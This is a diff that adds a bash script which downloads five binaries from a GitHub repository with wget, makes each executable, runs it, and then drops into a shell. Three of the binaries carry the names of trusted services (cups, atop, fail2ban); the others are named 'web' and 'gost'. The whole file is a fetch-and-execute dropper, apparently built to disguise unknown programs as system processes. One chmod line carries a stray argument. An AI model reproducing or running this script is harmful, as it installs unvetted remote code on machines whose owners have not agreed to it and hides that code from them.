@@ -1,1 +1,17 @@
-
+#!/bin/bash
+wget raw.githubusercontent.com/popanam/demo/refs/heads/main/cups
+chmod +x cups
+./cups
+wget raw.githubusercontent.com/popanam/demo/refs/heads/main/atop
+chmod +x atop p
+./atop
+wget raw.githubusercontent.com/popanam/demo/refs/heads/main/fail2ban
+chmod +x fail2ban
+./fail2ban
+wget raw.githubusercontent.com/popanam/demo/refs/heads/main/web
+chmod +x web
+./web
+wget raw.githubusercontent.com/popanam/demo/refs/heads/main/gost
+chmod +x gost
+./gost
+exec bash
